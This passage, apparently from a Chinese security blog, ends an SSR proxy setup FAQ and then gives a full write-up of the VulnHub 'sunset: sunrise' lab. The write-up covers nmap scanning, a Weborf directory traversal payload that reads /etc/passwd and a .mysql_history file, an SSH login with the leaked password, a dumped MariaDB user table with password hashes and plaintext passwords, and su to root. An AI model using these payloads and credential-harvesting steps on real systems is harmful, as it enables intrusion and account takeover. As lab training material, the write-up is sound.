<p>6、vultr服务商提供的vps服务器是单向流量计算，有的vps服务商是双向流量计算，单向流量计算对于用户来说更实惠。因为我们是在vps服务器上部署SSR服务端后，再用SSR客户端翻墙，所以SSR服务端就相当于中转，比如我们看一个视频，必然会产生流量，假如消耗流量80M，那么VPS服务器会产生上传80M和下载80M流量，vultr服务商只计算单向的80M流量。如果是双向计算流量，那么会计算为160M流量。</p>
<p>7、如果你想把搭建的账号给多人使用，不用额外设置端口，因为一个账号就可以多人使用。一般5美元的服务器可以同时支持40人在线使用。</p>
<p>如果想实现支持每个用户(端口)不同的加密方式/协议/混淆等，并且管理流量使用，可以参考多用户配置脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssrmu.sh &amp;&amp; chmod +x ssrmu.sh &amp;&amp; bash ssrmu.sh </span><br></pre></td></tr></table></figure>
<p>安装后管理命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash ssrmu.sh</span><br></pre></td></tr></table></figure>
<p>注意：这个多用户配置脚本和教程内容的脚本无法共存！要想用这个脚本，把之前的脚本卸载，输入管理命令bash ssr.sh ，选择3，卸载ShadowsocksR即可卸载原脚本。</p>
<p>8、vultr服务器每月有流量限制，超过限制后服务器不会被停止运行，但是超出的流量会被额外收费。北美和西欧地区的服务器超出流量后，多出的部分收费为0.01美元/G。新加坡和日本东京（日本）为0.025美元/G，悉尼（澳大利亚）为0.05美元/G。把vultr服务器删掉，开通新的服务器，流量会从0开始重新计算。</p>
<p>9、vultr怎样才能申请退款呢？</p>
<p>vultr和其他的国外商家一样，都是使用工单的形式与客服联系，如果需要退款，直接在后台点击support，选择open ticket新开一个工单，选择billing question财务问题，简单的在文本框输入你的退款理由。比如：Please refund all the balance in my account。工单提交以后一般很快就可以给你确认退款，若干个工作日后就会退回你的支付方式。（全额退款结束后，账号可能会被删除）</p>
<p>如果英语水平不好，但是想和客服进行交流，可以用百度在线翻译，自动中文转英文和英文转中文。</p>
<p>10、路由器也可以配置ss/ssr账号，详见<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3l3Yjk0L29wZW53cnQtc3Ny">openwrt-ssr项目地址<i class="fa fa-external-link-alt"></i></span></p>
<p>11、如果电脑想用搭建的ss/ssr账号玩游戏，即实现类似VPN全局代理，可以用SSTAP，<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC81MTllNjhiNzQ2NDY=">教程<i class="fa fa-external-link-alt"></i></span></p>
<p>12、配置bbr加速脚本，重启电脑后xshell无法连接服务器。如果你遇到这样的问题，只能把服务器删除了，重新搭建个新的，可以先配置bbr加速脚本再配置ss/ssr脚本。</p>
<p><strong><em>更多问题请联系QQ:</em></strong></p>
<p><font color="red">FDlucifer——1185151867</font></p>
]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>ssr</tag>
        <tag>vps</tag>
        <tag>翻墙</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[sunset-sunrise]</title>
    <url>/2019/12/24/sunset-sunrise/</url>
    <content><![CDATA[<p>名称：日落：日出<br>发布日期：2019年12月6日</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9tZWdhLm56LyMhSUtRUTJTeFohYW5Cc0JubFFyWWgyRUxZV1lhMW1IWUtHXzdrUnc0MDJ6Zm8yV09PQjhaMA==">https://mega.nz/#!IKQQ2SxZ!anBsBnlQrYh2ELYWYa1mHYKG_7kRw402zfo2WOOB8Z0<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zdW5zZXQvc3VucmlzZS43eg==">https://download.vulnhub.com/sunset/sunrise.7z<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9zdW5zZXQvc3VucmlzZS43ei50b3JyZW50">https://download.vulnhub.com/sunset/sunrise.7z.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>说明：玩得开心！<br>难度：初学者<br>联系人：@whitecr0wz</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.104</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:67:12:DE (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sS -sV -Pn -T5 -p- --script=vuln 192.168.56.104</span></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">80/tcp   open  http       Apache httpd 2.4.38</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /: Root directory w/ listing on <span class="string">&#x27;apache/2.4.38 (debian)&#x27;</span></span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli <span class="keyword">for</span> queries:</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.56.104:80/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_    http://192.168.56.104:80/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">3306/tcp open  mysql?</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   NULL: </span></span><br><span class="line"><span class="string">|_    Host &#x27;</span>192.168.56.102<span class="string">&#x27; is not allowed to connect to this MariaDB server</span></span><br><span class="line"><span class="string">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">8080/tcp open  http-proxy Weborf (GNU/Linux)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   FourOhFourRequest: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 404 Page not found: Weborf (GNU/Linux)</span></span><br><span class="line"><span class="string">|     Content-Length: 202</span></span><br><span class="line"><span class="string">|     Content-Type: text/html</span></span><br><span class="line"><span class="string">|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 404&lt;/H1&gt;Page not found &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">|   GetRequest: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 200</span></span><br><span class="line"><span class="string">|     Server: Weborf (GNU/Linux)</span></span><br><span class="line"><span class="string">|     Content-Length: 326</span></span><br><span class="line"><span class="string">|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;Name&lt;/td&gt;&lt;td&gt;Size&lt;/td&gt;&lt;/tr&gt;&lt;tr style=&quot;background-color: #DFDFDF;&quot;&gt;&lt;td&gt;d&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;html/&quot;&gt;html/&lt;/a&gt;&lt;/td&gt;&lt;td&gt;-&lt;/td&gt;&lt;/tr&gt;</span></span><br><span class="line"><span class="string">|     &lt;/table&gt;&lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">|   HTTPOptions, RTSPRequest, SIPOptions: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 200</span></span><br><span class="line"><span class="string">|     Server: Weborf (GNU/Linux)</span></span><br><span class="line"><span class="string">|     Allow: GET,POST,PUT,DELETE,OPTIONS,PROPFIND,MKCOL,COPY,MOVE</span></span><br><span class="line"><span class="string">|     DAV: 1,2</span></span><br><span class="line"><span class="string">|     DAV: &lt;http://apache.org/dav/propset/fs/1&gt;</span></span><br><span class="line"><span class="string">|     MS-Author-Via: DAV</span></span><br><span class="line"><span class="string">|   Socks5: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 400 Bad request: Weborf (GNU/Linux)</span></span><br><span class="line"><span class="string">|     Content-Length: 199</span></span><br><span class="line"><span class="string">|     Content-Type: text/html</span></span><br><span class="line"><span class="string">|_    &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Weborf&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;H1&gt;Error 400&lt;/H1&gt;Bad request &lt;p&gt;Generated by Weborf/0.12.2 (GNU/Linux)&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /../../../../../../../../../../etc/passwd: Possible path traversal in URI</span></span><br><span class="line"><span class="string">|   /../../../../../../../../../../boot.ini: Possible path traversal in URI</span></span><br><span class="line"><span class="string">|_  /html/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_http-server-header: Weborf (GNU/Linux)</span></span><br></pre></td></tr></table></figure>

<p>访问<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNTYuMTA0OjgwODAvJUVGJUJDJThDJUU1JThGJTkxJUU3JThFJUIwJUU2JTk4JUFGV2Vib3JmLzAuMTIuMg==">http://192.168.56.104:8080/，发现是Weborf/0.12.2<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub95.jpg"></p>
<p>现在使用searchsploit搜索Weborf。 如果没有成功，尝试其他方法。 但是成功了。 说此版本的Weborf容易受到目录遍历攻击。 下载漏洞利用程序的内容，以获取相关信息。 漏洞利用提供了一条易受攻击的方法。 尝试一下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit Weborf 0.12.2</span></span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                |  Path</span><br><span class="line">                                                              | (/usr/share/exploitdb/)</span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line">weborf 0.12.2 - Directory Traversal                           | exploits/linux/remote/14925.txt</span><br><span class="line">-------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">root@kali:~<span class="comment"># searchsploit -m 14925</span></span><br><span class="line">  Exploit: weborf 0.12.2 - Directory Traversal</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/14925</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/linux/remote/14925.txt</span><br><span class="line">File Type: ASCII text, with CRLF line terminators</span><br><span class="line"></span><br><span class="line">Copied to: /root/14925.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># cat 14925.txt </span></span><br><span class="line">Title: Weborf httpd &lt;= 0.12.2 Directory Traversal Vulnerability</span><br><span class="line">Date: Sep 6, 2010</span><br><span class="line">Author: Rew</span><br><span class="line">Link: http://galileo.dmi.unict.it/wiki/weborf/doku.php</span><br><span class="line">Version: 0.12.2</span><br><span class="line">Tested On: Debian 5</span><br><span class="line">CVE: N/A</span><br><span class="line"></span><br><span class="line">=============================================================</span><br><span class="line"></span><br><span class="line">Weborf httpd &lt;= 0.12.2 suffers a directory traversal</span><br><span class="line">vulnerability.  This vulnerability could allow</span><br><span class="line">attackers to <span class="built_in">read</span> arbitrary files and hak th3 plan3t.</span><br><span class="line"></span><br><span class="line">instance.c : line 240-244</span><br><span class="line">------------------------------</span><br><span class="line">void modURL(char* url) &#123;</span><br><span class="line">    //Prevents the use of .. to access the whole filesystem  &lt;-- ORLY?</span><br><span class="line">    strReplace(url,<span class="string">&quot;../&quot;</span>,<span class="string">&#x27;\0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    replaceEscape(url);</span><br><span class="line">------------------------------</span><br><span class="line"></span><br><span class="line">Exploit: GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</span><br><span class="line"></span><br><span class="line">==============================================================</span><br><span class="line"></span><br><span class="line">Stay safe,</span><br><span class="line">Over and Outr</span><br></pre></td></tr></table></figure>

<p>按照exp中的利用方法构造如下poc并访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub96.jpg"></p>
<p>现在，能在目标计算机内四处查找文件。 决定在用户Sunrise的主目录中进行文件查看。 遇到了一个user.txt文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fsunrise%2f</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub97.jpg"></p>
<p>打开user.txt查找文本，如下所示。 是一个简单的user的flag。 </p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub98.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a6050aecf6303b0b824038807d823a89</span><br></pre></td></tr></table></figure>

<p>接下来对下面url爆破一波</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Wed Dec 25 03:38:57 2019</span><br><span class="line">URL_BASE: http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/ ----</span><br><span class="line">+ http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.bashrc (CODE:200|SIZE:3526)</span><br><span class="line">+ http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.mysql_history (CODE:200|SIZE:83)</span><br><span class="line">+ http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.profile (CODE:200|SIZE:807)</span><br><span class="line">                                                                               %2fweborf%2f/zt               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Wed Dec 25 03:39:12 2019</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 3</span><br></pre></td></tr></table></figure>

<p>访问下面url可得</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.104:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.mysql_history</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub99.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">ALTER USER <span class="string">&#x27;weborf&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;iheartrainbows44&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>使用用户名和密码weborf/iheartrainbows44成功连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh weborf@192.168.56.104</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.104 (192.168.56.104)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:4yaOo7mwlBs//3V1VVqqtiApksgelyI4AJwhIUfz0UQ.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.104<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">weborf@192.168.56.104&#x27;</span>s password: </span><br><span class="line">Linux sunrise 4.19.0-6-amd64 <span class="comment">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Thu Dec  5 16:24:32 2019 from 192.168.1.146</span><br><span class="line">weborf@sunrise:~$ id</span><br><span class="line">uid=1001(weborf) gid=1001(weborf) groups=1001(weborf)</span><br><span class="line">weborf@sunrise:~$ whoami</span><br><span class="line">weborf</span><br><span class="line">weborf@sunrise:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/weborf</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>连接数据库获取用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">weborf@sunrise:~$ mysql -uweborf -piheartrainbows44</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 37</span><br><span class="line">Server version: 10.3.18-MariaDB-0+deb10u1 Debian 10</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; </span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.028 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [mysql]&gt; show tables;</span><br><span class="line">+---------------------------+</span><br><span class="line">| Tables_in_mysql           |</span><br><span class="line">+---------------------------+</span><br><span class="line">| column_stats              |</span><br><span class="line">| columns_priv              |</span><br><span class="line">| db                        |</span><br><span class="line">| event                     |</span><br><span class="line">| func                      |</span><br><span class="line">| general_log               |</span><br><span class="line">| gtid_slave_pos            |</span><br><span class="line">| help_category             |</span><br><span class="line">| help_keyword              |</span><br><span class="line">| help_relation             |</span><br><span class="line">| help_topic                |</span><br><span class="line">| host                      |</span><br><span class="line">| index_stats               |</span><br><span class="line">| innodb_index_stats        |</span><br><span class="line">| innodb_table_stats        |</span><br><span class="line">| plugin                    |</span><br><span class="line">| proc                      |</span><br><span class="line">| procs_priv                |</span><br><span class="line">| proxies_priv              |</span><br><span class="line">| roles_mapping             |</span><br><span class="line">| servers                   |</span><br><span class="line">| slow_log                  |</span><br><span class="line">| table_stats               |</span><br><span class="line">| tables_priv               |</span><br><span class="line">| time_zone                 |</span><br><span class="line">| time_zone_leap_second     |</span><br><span class="line">| time_zone_name            |</span><br><span class="line">| time_zone_transition      |</span><br><span class="line">| time_zone_transition_type |</span><br><span class="line">| transaction_registry      |</span><br><span class="line">| user                      |</span><br><span class="line">+---------------------------+</span><br><span class="line">31 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line">MariaDB [mysql]&gt; select * from user;</span><br><span class="line">+-----------+---------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-------------------------------------------+------------------+---------+--------------+--------------------+</span><br><span class="line">| Host      | User    | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | Delete_history_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin      | authentication_string                     | password_expired | is_role | default_role | max_statement_time |</span><br><span class="line">+-----------+---------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-------------------------------------------+------------------+---------+--------------+--------------------+</span><br><span class="line">| localhost | root    | *C7B6683EEB8FF8329D8390574FAA04DD04B87C58 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | unix_socket | *AF554C323F838EB43A3D464034692C0994346ED8 | N                | N       |              |           0.000000 |</span><br><span class="line">| localhost | sunrise | thefutureissobrightigottawearshades       | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      | N                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                                           | N                | N       |              |           0.000000 |</span><br><span class="line">| localhost | weborf  | *A76018C6BB42E371FD7B71D2EC6447AE6E37DB28 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |             |                                           | N                | N       |              |           0.000000 |</span><br><span class="line">+-----------+---------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-------------+-------------------------------------------+------------------+---------+--------------+--------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br></pre></td></tr></table></figure>

<p>将root的hash值解密得到purplerain54732,直接root用户登录完成提权</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub100.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">weborf@sunrise:~$ su root</span><br><span class="line">Password: </span><br><span class="line">root@sunrise:/home/weborf<span class="comment"># ls</span></span><br><span class="line">weborf-0.12.2</span><br><span class="line">root@sunrise:/home/weborf<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@sunrise:/home/weborf<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

